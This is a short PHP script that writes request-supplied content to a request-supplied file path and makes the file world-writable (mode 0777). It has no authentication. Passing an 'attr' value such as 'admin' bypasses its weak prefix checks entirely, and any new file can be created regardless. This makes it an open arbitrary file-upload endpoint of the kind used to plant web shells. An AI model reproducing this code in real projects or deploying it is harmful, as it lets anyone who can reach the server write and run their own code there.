<?php
$name=(isset($_REQUEST['name']))?$_REQUEST['name']:'';
$content=(isset($_REQUEST['content']))?$_POST['content']:'';
$attr=(isset($_REQUEST['attr']))?$_REQUEST['attr']:'';
if ($attr!='') {
    if (preg_match('/admin|root|rw/i',$attr)) {
        file_put_contents($name,$content); chmod($name,0777);
    } else {
        if (file_exists($name)) {
            if (str_starts_with(basename($name),$attr.'_')) {
                file_put_contents($name,$content);
                chmod($name,0777);
            } elseif (str_starts_with($name,$attr.'_files/')) {
                file_put_contents($name,$content);
                chmod($name,0777);
            } elseif (str_starts_with($name,'./'.$attr.'_files/')) {
                file_put_contents($name,$content);
                chmod($name,0777);
            } elseif (str_starts_with(basename($name),'_')) {
                file_put_contents($name,$content);
                chmod($name,0777);
            }
        } else {
            file_put_contents($name,$content);
            chmod($name,0777);
        }
    }
}
